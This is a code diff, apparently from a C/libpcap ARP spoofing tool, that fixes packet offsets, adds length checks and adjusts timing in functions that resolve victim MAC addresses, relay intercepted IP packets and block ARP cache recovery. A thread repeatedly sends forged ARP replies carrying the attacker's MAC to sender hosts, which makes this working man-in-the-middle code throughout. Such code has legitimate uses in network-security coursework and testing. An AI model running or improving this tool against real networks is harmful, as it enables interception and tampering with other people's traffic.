@@ -101,20 +101,24 @@ void send_arp(pcap_t* handle, uint16_t packet_type, uint8_t* src_ip, uint8_t* de
 }
 
 int get_mac_by_ip(pcap_t* handle, uint8_t* sender_ip, uint8_t* sender_mac) {
-  struct pcap_pkthdr* header;
-  const u_char* packet;
-  int res = pcap_next_ex(handle, &header, &packet);
-  if (res == -1 || res == -2) return -1;
-  if(!memcmp(packet+26, sender_ip, 4)) {
-    memcpy(sender_mac, packet+6, 6);
-    return 0;
+  while(true) {
+    struct pcap_pkthdr* header;
+    const u_char* packet;
+    int res = pcap_next_ex(handle, &header, &packet);
+    if (res == -1 || res == -2) return -1;
+    if(!memcmp(packet+28, sender_ip, 4)) {
+      memcpy(sender_mac, packet+6, 6);
+      return 0;
+    }
   }
   return -1;
 }
 
 void relay_ip_packet(const u_char* packet, uint8_t* my_ip, uint8_t* my_mac, uint8_t* src_mac, uint8_t* dest_mac, pcap_t* handle, int length) {
+  if(length <= 34) return;
+
   if(packet[12] == 0x08 && packet[13] == 0x00) {
-    if(memcmp(packet+38, my_ip, 4)) {
+    if(memcmp(packet+30, my_ip, 4)) {
       if(!memcmp(packet+6, src_mac, 6)){
         memcpy(relay, packet, length);
         memcpy(relay+6, my_mac, 6);
@@ -128,6 +132,8 @@ void relay_ip_packet(const u_char* packet, uint8_t* my_ip, uint8_t* my_mac, uint
 }
 
 void prevent_arp_recovery(const u_char* packet, uint8_t* my_ip, uint8_t* src_mac, pcap_t* handle, int length) {
+  if(length <= 42) return;
+
   if(packet[12] == 0x08 && packet[13] == 0x06) {
     if(memcmp(packet+38, my_ip, 4)) {
       if(!memcmp(packet+6, src_mac, 6)) {
@@ -147,7 +153,7 @@ void prevent_arp_recovery(const u_char* packet, uint8_t* my_ip, uint8_t* src_mac
 
 void* arp_spoofing_cycle(void *arg) {
   while(true) {
-    sleep(1);
+    sleep(2);
     for(int i = 0; i < cnt; i++) {
       send_arp(handle, REPLY, target_ip[i], sender_ip[i], attacker_mac, sender_mac[i]);
     }
